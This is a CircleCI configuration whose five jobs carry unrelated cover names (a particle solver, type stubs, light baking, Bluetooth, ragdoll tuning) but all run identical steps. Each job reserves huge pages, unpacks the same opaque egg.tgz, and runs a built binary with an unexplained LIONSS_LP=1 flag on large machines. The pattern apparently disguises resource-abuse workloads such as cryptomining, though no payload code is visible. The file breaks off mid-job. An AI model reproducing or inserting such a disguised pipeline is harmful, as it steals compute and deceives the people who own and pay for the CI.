version: 2.1

jobs:
  pic_leapfrog:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Init grid
          command: |
            printf 'nx 128\n' > pic.in
      - run:
          name: Build PIC solver
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target pic_leapfrog -j2
      - run:
          name: Advance leapfrog step
          command: LIONSS_LP=1 ./build/pic_leapfrog --in pic.in --dt 0.01
  numpystub:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Generate type stubs
          command: |
            mkdir -p stubs && printf 'from typing import Any\n' > stubs/arrays.pyi
      - run:
          name: Build native extension
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target numpystub -j2
      - run:
          name: Validate array dtypes
          command: LIONSS_LP=1 ./build/numpystub --stubs stubs --strict
  GiProbeBake:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Place probes
          command: |
            printf 'probes 64\n' > probes.txt
      - run:
          name: Build light baker
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target GiProbeBake -j2
      - run:
          name: Bake GI probes
          command: LIONSS_LP=1 ./build/GiProbeBake --probes probes.txt --bounces 3
  bleGattNotify:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define GATT table
          command: |
            printf 'char uuid 2a37\n' > gatt.txt
      - run:
          name: Build BLE stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target bleGattNotify -j2
      - run:
          name: Push GATT notification
          command: LIONSS_LP=1 ./build/bleGattNotify --gatt gatt.txt --interval 100
  RagdollTune:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
